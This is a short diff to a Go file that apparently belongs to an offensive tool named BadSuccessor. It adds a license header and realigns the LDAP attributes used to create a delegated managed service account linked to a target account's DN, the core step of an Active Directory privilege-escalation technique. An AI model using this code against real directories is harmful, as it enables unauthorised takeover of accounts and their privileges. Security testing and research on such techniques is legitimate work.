@@ -1,3 +1,6 @@
+// SPDX-License-Identifier: Apache-2.0
+// Copyright 2026 Jacob Paullus
+
 package main
 
 import (
@@ -384,15 +387,15 @@ func (b *BadSuccessor) AddDMSA() bool {
 
 	// Build attributes for dMSA
 	attributes := map[string][]string{
-		"objectClass":                 {"msDS-DelegatedManagedServiceAccount"},
-		"cn":                          {b.dmsaName},
-		"sAMAccountName":              {b.dmsaName + "$"},
-		"dNSHostName":                 {dnsHost},
-		"userAccountControl":          {"4096"},
-		"msDS-ManagedPasswordInterval": {"30"},
-		"msDS-DelegatedMSAState":      {"2"},
-		"msDS-SupportedEncryptionTypes": {"28"},
-		"accountExpires":              {"9223372036854775807"},
+		"objectClass":                       {"msDS-DelegatedManagedServiceAccount"},
+		"cn":                                {b.dmsaName},
+		"sAMAccountName":                    {b.dmsaName + "$"},
+		"dNSHostName":                       {dnsHost},
+		"userAccountControl":                {"4096"},
+		"msDS-ManagedPasswordInterval":      {"30"},
+		"msDS-DelegatedMSAState":            {"2"},
+		"msDS-SupportedEncryptionTypes":     {"28"},
+		"accountExpires":                    {"9223372036854775807"},
 		"msDS-ManagedAccountPrecededByLink": {targetDN},
 	}
 
